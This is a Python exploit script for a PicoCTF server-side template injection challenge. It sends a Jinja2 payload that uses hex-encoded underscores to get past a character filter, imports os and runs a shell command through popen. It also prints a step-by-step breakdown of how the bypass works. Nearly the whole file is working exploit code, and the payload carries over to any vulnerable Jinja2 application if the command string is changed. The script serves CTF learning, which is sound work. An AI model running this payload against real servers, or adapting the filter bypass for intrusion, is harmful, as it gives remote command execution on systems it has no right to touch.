#!/usr/bin/env python3
"""
PicoCTF SSTI 2 - Exploit Script
Demonstrates the Server-Side Template Injection bypass technique
"""

import requests
import sys
from urllib.parse import quote

def main():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <target_url>")
        print("Example: python exploit.py http://challenge.com/vulnerable_endpoint")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # The payload that bypasses character filters using hex encoding
    payload = '{{ self|attr("\\x5f\\x5finit\\x5f\\x5f")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")("cat flag")|attr("read")() }}'
    
    print("[+] PicoCTF SSTI 2 Exploit")
    print(f"[+] Target: {target_url}")
    print(f"[+] Payload: {payload}")
    print()
    
    try:
        # Prepare the request data
        data = {
            'input': payload  # Adjust field name based on actual form
        }
        
        # Send the exploit
        print("[+] Sending payload...")
        response = requests.post(target_url, data=data, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Response received (Status: {response.status_code})")
            print("[+] Response content:")
            print("-" * 50)
            print(response.text)
            print("-" * 50)
            
            # Look for flag pattern
            import re
            flag_pattern = r'picoCTF\{[^}]+\}'
            flags = re.findall(flag_pattern, response.text)
            
            if flags:
                print(f"\n[!] FLAG FOUND: {flags[0]}")
            else:
                print("\n[!] No flag pattern found in response")
                
        else:
            print(f"[-] Request failed with status code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

def test_payload_components():
    """
    Test individual components of the payload to understand the bypass technique
    """
    print("[+] Testing payload components:")
    print()
    
    # Show the hex encoding bypass
    print("1. Character Filter Bypass:")
    print("   Blocked: _")
    print("   Bypass: \\x5f (hex encoding)")
    print()
    
    # Show the method chain
    print("2. Method Chain Breakdown:")
    methods = [
        "self",
        "attr('\\x5f\\x5finit\\x5f\\x5f')",
        "attr('\\x5f\\x5fglobals\\x5f\\x5f')",
        "attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')",
        "attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')",
        "attr('popen')('cat flag')",
        "attr('read')()"
    ]
    
    for i, method in enumerate(methods, 1):
        print(f"   Step {i}: {method}")
    print()
    
    # Show Python equivalent
    print("3. Python Equivalent:")
    print("   import os")
    print("   result = os.popen('cat flag').read()")
    print("   print(result)")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        test_payload_components()
    else:
        main()
